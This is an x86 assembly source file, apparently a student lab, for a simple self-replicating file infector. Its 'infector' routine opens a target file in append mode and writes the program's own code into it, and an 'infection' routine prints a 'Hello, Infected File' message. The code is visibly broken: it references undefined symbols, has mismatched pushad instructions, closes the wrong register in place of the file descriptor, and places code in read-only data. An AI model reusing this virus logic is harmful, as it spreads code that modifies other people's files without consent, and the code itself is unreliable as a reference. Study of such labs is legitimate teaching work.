section .text
global _start
global system_call
global infector
global infection
extern main

section .data
section .rodata
    message db "Hello, Infected File", 10
    length: equ $ - message

code_start:
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


infection:
    ; Print "Hello, Infected File"
    mov eax, 4        ; System call number for sys_write
    mov ebx, 1        ; File descriptor 1 (stdout)
    mov ecx, message  ; Address of the message string
    mov edx, length        ; Length of the message
    
    pushad
    push 4
    push char
    push dword[OutFile]
    push 4
    call system_call
    add esp, 16
    pushad
    

    mov esp, ebp
    pop ebp
    ret

infector:
    ; Open the file for appending
    mov eax, 5        ; System call number for sys_open
    mov ebx, [esp+4]  ; File name argument
    mov ecx, 2001o     ; Flags for append mode
    mov edx, length
    int 0x80          ; Call kernel
    mov edx, eax      ; Store the file descriptor
    ; Write the virus code to the file
    mov ebx, eax      ; File descriptor
    mov eax, 4        ; System call number for sys_write
    mov ecx, code_start  ; Address of virus code
    mov edx, code_end - code_start  ; Length of virus code
    int 0x80          ; Call kernel

    ; Close the file
    mov eax, 6        ; System call number for sys_close
    mov ebx, edx      ; File descriptor
    int 0x80          ; Call kernel
    ret
code_end:
